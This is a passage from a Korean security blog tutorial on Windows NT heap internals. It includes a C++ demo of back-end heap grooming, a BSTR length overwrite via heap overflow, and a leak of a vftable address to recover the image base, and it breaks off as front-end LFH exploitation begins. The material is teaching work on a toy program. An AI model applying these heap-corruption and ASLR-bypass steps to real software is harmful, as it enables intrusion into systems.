href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_SUBSEGMENT</a> &#xB97C; &#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_ENTRY-&gt;UnusedBytes</a> &#xAC12;&#xC744; <code>0x80</code>&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.<ul><li><code>UnusedBytes</code>&#xAC00; <code>0x80</code>&#xC774;&#xBA74; &#xD574;&#xC81C;&#xB41C; LFH chunk&#xB85C; &#xC778;&#xC2DD;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li>chunk&#xC758; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xCC3E;&#xC544; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xBE44;&#xD2B8;&#xB9F5;&#xC778; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a>&#xC5D0; &#xD574;&#xC81C;&#xD560; chunk&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; bit&#xB97C; 0&#xC73C;&#xB85C; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">_HEAP_SUBSEGMENT-&gt;AggregateExchg</a> &#xC758; depth&#xB97C; 1 &#xC99D;&#xAC00;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li>&#xB9CC;&#xC57D; &#xD574;&#xC81C;&#xB41C; chunk&#xAC00; <code>ActiveSubsegment</code> &#xC5D0; &#xC18D;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; <code>CachedItem</code> &#xC5D0; &#xB123;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol><h2 id="Size-gt-0xff000-1"><a href="#Size-gt-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><ol><li>&#xD574;&#xC81C;&#xD560; chunk&#xB97C; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;VirtualAllocdBlocks</a> &#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>RtlSecMemFreeVirtualMemory</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD560;&#xB2F9; &#xD574;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xBCF5;&#xC7A1;&#xD55C; &#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4; &#xD544;&#xB4DC; &#xC124;&#xBA85;&#xC744; &#xBCF4;&#xBA74;&#xC11C; &#xC774;&#xD574;&#xD558;&#xBA74; <del>&#xADF8;&#xB798;&#xB3C4; &#xBCF5;&#xC7A1;&#xD558;&#xC9C0;&#xB9CC;</del> Heap &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD00;&#xB9AC;&#xD558;&#xB294;&#xC9C0; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;!</p><h1 id="NT-Heap-Exploitation"><a href="#NT-Heap-Exploitation" class="headerlink" title="NT Heap Exploitation"></a>NT Heap Exploitation</h1><p>&#xC77C;&#xBC18;&#xC801;&#xC778; Back-End exploitation&#xACFC; LFH&#xC778; Front-End exploitation &#xB450; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;. </p><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><p>LFH&#xB294; <code>0x4000</code> &#xC774;&#xD558; &#xD06C;&#xAE30;&#xC758; chunk&#xAC00; 18&#xAC1C; &#xD560;&#xB2F9;&#xB420; &#xB54C;&#xBD80;&#xD130; &#xD65C;&#xC131;&#xD654;&#xB41C;&#xB2E4;&#xB294; <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap">&#xB0B4;&#xC6A9;</a>&#xC774; part 2&#xC5D0;&#xC11C; &#xB098;&#xC654;&#xC5C8;&#xC8E0;? Back-End&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB824;&#xBA74; LFH&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC5EC;&#xC57C; &#xD558;&#xBBC0;&#xB85C; chunk &#xD560;&#xB2F9;&#xC744; 18&#xAC1C; &#xBBF8;&#xB9CC;&#xC73C;&#xB85C; &#xC81C;&#xD55C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xBCF4;&#xD1B5; &#xCCAB; &#xBC88;&#xC9F8;(index 0)&#xC640; &#xB450; &#xBC88;&#xC9F8;(index 1) &#xD560;&#xB2F9;&#xC5D0;&#xB3C4; chunk &#xAC04; &#xAC70;&#xB9AC;&#xAC00; &#xD06C;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC801;&#xD569;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xC6B0;&#xB9AC;&#xAC00; &#xC811;&#xADFC;&#xD558;&#xAE30; &#xC88B;&#xC740; chunk&#xC758; index&#xB294; 2 ~ 16 &#xAE4C;&#xC9C0;&#xACA0;&#xB124;&#xC694;. &#xADF8; &#xC774;&#xD6C4;&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; heap overflow&#xB85C; chunk&#xB97C; &#xC815;&#xB82C;&#xD558;&#xACE0; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC18C;&#xB97C; leak &#xD558;&#xB294; &#xBC29;&#xBC95;&#xACFC; &#xB3D9;&#xC77C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xC81C;&#xCF54;&#xB4DC;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAC8C;&#xC694;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;comdef.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x190</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALLOC_COUNT 10</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeObject</span> {</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">function1</span><span class="hljs-params">()</span> </span>{};    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">virtual_function1</span><span class="hljs-params">()</span> </span>{};};<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> args, <span class="hljs-keyword">char</span>** argv)</span> </span>{    <span class="hljs-keyword">int</span> i;    BSTR bstr;    HANDLE hChunk;    <span class="hljs-keyword">void</span>* allocations[ALLOC_COUNT];    BSTR bStrings[<span class="hljs-number">5</span>];    SomeObject* object = <span class="hljs-keyword">new</span> SomeObject();    HANDLE defaultHeap = GetProcessHeap();    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Default heap = 0x%08x\n&quot;</span>, defaultHeap);    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ALLOC_COUNT; i++) {        hChunk = HeapAlloc(defaultHeap, <span class="hljs-number">0</span>, CHUNK_SIZE);        <span class="hljs-built_in">memset</span>(hChunk, <span class="hljs-string">&apos;A&apos;</span>, CHUNK_SIZE);        allocations[i] = hChunk;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] Heap chunk in backend : 0x%08x\n&quot;</span>, i, hChunk);    }    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 3: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">3</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">3</span>]);       <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {        bstr = SysAllocString(<span class="hljs-string">L&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>);        bStrings[i] = bstr;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%d] BSTR string : 0x%08x\n&quot;</span>, i, bstr);    }    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing allocation at index 4: 0x%08x\n&quot;</span>, allocations[<span class="hljs-number">4</span>]);    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[<span class="hljs-number">4</span>]);    <span class="hljs-keyword">int</span> objRef = (<span class="hljs-keyword">int</span>)object;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject address for Chunk 3 : 0x%08x\n&quot;</span>, objRef);    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array1</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array2</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array3</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array4</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array5</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array6</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array7</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array8</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array9</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-function"><span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">array10</span><span class="hljs-params">(<span class="hljs-number">40</span>, objRef)</span></span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array1);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array2);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array3);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SomeObject array : 0x%08x\n&quot;</span>, array4);           system(<span class="hljs-string">&quot;PAUSE&quot;</span>);     UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);    <span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;    <span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));    strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);    <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];    <span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);    <span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);    system(<span class="hljs-string">&quot;PAUSE&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><ol><li>index 0~9&#xAE4C;&#xC9C0; chunk 10&#xAC1C;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;. </li><li>chunk[3]&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xB4A4; BSTR string&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>BSTR : <code>Header + String + NULL terminator</code> &#xD615;&#xC2DD;&#xC758; &#xC790;&#xB8CC;&#xD615;&#xC73C;&#xB85C; &#xAC01; &#xBB38;&#xC790;&#xB294; 2 bytes &#xD06C;&#xAE30;&#xB97C; &#xAC00;&#xC9C0;&#xBA70; &#xD5E4;&#xB354;&#xC5D0; &#xAC1D;&#xCCB4;&#xC758; size&#xAC00; &#xC800;&#xC7A5;&#xB428;</li></ul></li><li>chunk[4]&#xB97C; &#xD574;&#xC81C;&#xD55C; &#xB4A4; virtual function table pointer&#xAC00; &#xC788;&#xB294; <code>SomeObject</code> &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC744; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%202.png" alt="pwncoolsexy-part3/Untitled%202.png"></p><pre><code class="hljs cpp">| CHUNK[<span class="hljs-number">0</span>] | CHUNK[<span class="hljs-number">1</span>] | CHUNK [<span class="hljs-number">2</span>] | BSTR [<span class="hljs-number">0</span>] | SomeObejct | CHUNK[<span class="hljs-number">5</span>] | ...</code></pre><p>&#xC2E4;&#xD589;&#xACB0;&#xACFC;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xD55C; chunk[3]&#xC5D0; BSTR[0] &#xC774;, chunk[4]&#xC5D0;&#xB294; SomeObject &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC774; &#xD560;&#xB2F9;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%203.png" alt="pwncoolsexy-part3/Untitled%203.png"></p><p>&#xBA54;&#xBAA8;&#xB9AC; &#xB364;&#xD504;&#xC5D0;&#xC11C; &#xBD10;&#xB3C4; &#xC608;&#xC058;&#xAC8C; &#xC798; &#xC815;&#xB82C;&#xB410;&#xB124;&#xC694;~</p><p>heap overflow&#xB97C; &#xC774;&#xC6A9;&#xD574; chunk[2]&#xC5D0;&#xC11C; BSTR &#xD5E4;&#xB354;&#xC758; length &#xD544;&#xB4DC;&#xC758; &#xAC12;&#xC744; <code>F8</code> &#x2192; <code>FF</code> &#xB85C; &#xC218;&#xC815;&#xD558;&#xBA74; &#xB2E4;&#xC74C; chunk&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">... UINT strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overflowing allocation 2\n&quot;</span>);<span class="hljs-keyword">char</span> evilString[] =        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;BBBBBBBBBBBBBBBB&quot;</span>        <span class="hljs-string">&quot;CCCCDDDD&quot;</span>        <span class="hljs-string">&quot;\xff\x00\x00\x00&quot;</span>;<span class="hljs-built_in">memcpy</span>(allocations[<span class="hljs-number">2</span>], evilString, <span class="hljs-keyword">sizeof</span>(evilString));strSize = SysStringByteLen(bStrings[<span class="hljs-number">0</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Modified String size: %d\n&quot;</span>, (<span class="hljs-keyword">int</span>)strSize);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%204.png" alt="pwncoolsexy-part3/Untitled%204.png"></p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%205.png" alt="pwncoolsexy-part3/Untitled%205.png"></p><p>&#xC774;&#xC81C; vftable &#xC8FC;&#xC18C;&#xB97C; &#xC77D;&#xB294; &#xAC83;&#xB9CC; &#xB0A8;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">...<span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> <span class="hljs-title">ws</span><span class="hljs-params">(bStrings[<span class="hljs-number">0</span>], strSize)</span></span>;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">wstring</span> ref = ws.substr(<span class="hljs-number">120</span> + <span class="hljs-number">16</span>, <span class="hljs-number">4</span>);<span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<span class="hljs-built_in">memcpy</span>(buf, ref.data(), <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> refAddr = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">memcpy</span>(buf, (<span class="hljs-keyword">void</span>*)refAddr, <span class="hljs-number">4</span>);<span class="hljs-keyword">int</span> vftable = <span class="hljs-keyword">int</span>((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">3</span>]) &lt;&lt; <span class="hljs-number">24</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">16</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span> | (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(buf[<span class="hljs-number">0</span>]));<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Found vftable address : 0x%08x\n&quot;</span>, vftable);...</code></pre><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%206.png" alt="pwncoolsexy-part3/Untitled%206.png"></p><p>vftable &#xC8FC;&#xC18C;&#xC758; offset&#xC740; &#xACE0;&#xC815;&#xC774;&#xBBC0;&#xB85C; offset&#xC744; &#xAD6C;&#xD574;&#xB450;&#xBA74; &#xC774;&#xD6C4;&#xC5D0; imagebase&#xAC00; &#xBC14;&#xB00C;&#xC5B4;&#xB3C4; vftable&#xC744; leak &#xD55C; &#xB4A4; offset&#xC744; &#xBE7C; imagebase&#xB97C; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">Executable search path is: ModLoad: <span class="hljs-number">002f</span>0000 <span class="hljs-number">002f</span>9000   C:\Users\dw0rdptr\source\repos\LFH\Release\LFH.exeModLoad: <span class="hljs-number">77210000</span> <span class="hljs-number">773b</span>2000   C:\WINDOWS\SYSTEM32\ntdll.dllModLoad: <span class="hljs-number">75</span>a80000 <span class="hljs-number">75b</span>70000   C:\WINDOWS\System32\KERNEL32.DLL</code></pre><p>&#xD604;&#xC7AC; imagebase &#xAC00; <code>0x2f0000</code>&#xC774;&#xB2C8;&#xAE4C; offset&#xC740; <code>0x2f4690 - 0x2f0000 = 0x4690</code> &#xAC00; &#xB429;&#xB2C8;&#xB2E4;. </p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%207.png" alt="pwncoolsexy-part3/Untitled%207.png"></p><p>&#xC81C;&#xB300;&#xB85C; &#xAD6C;&#xD588;&#xB124;&#xC694;! &#xC774;&#xB807;&#xAC8C; LFH&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; Heap&#xC740; chunk&#xB97C; &#xC7AC;&#xD65C;&#xC6A9;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC27D;&#xAC8C; &#xC774;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h2><p>LFH&#xB294; &#xB2E4;&#xC74C; &#xD560;&#xB2F9;&#xB418;&#xB294; chunk&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xB79C;&#xB364;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD574; heap overflow&#xB098; UAF &#xB4F1;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD574;&#xB3C4; heap&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xB3C4;&#xB85D; &#xC124;&#xACC4;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; LFH&#xC5D0;&#xC11C;&#xC758; exploitation &#xBAA9;&#xD45C;&#xB294; <code>&#xD574;&#xC81C; &#xD6C4; &#xC7AC; &#xD560;&#xB2F9;&#xB418;&#xB294; chunk&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC608;&#xCE21; 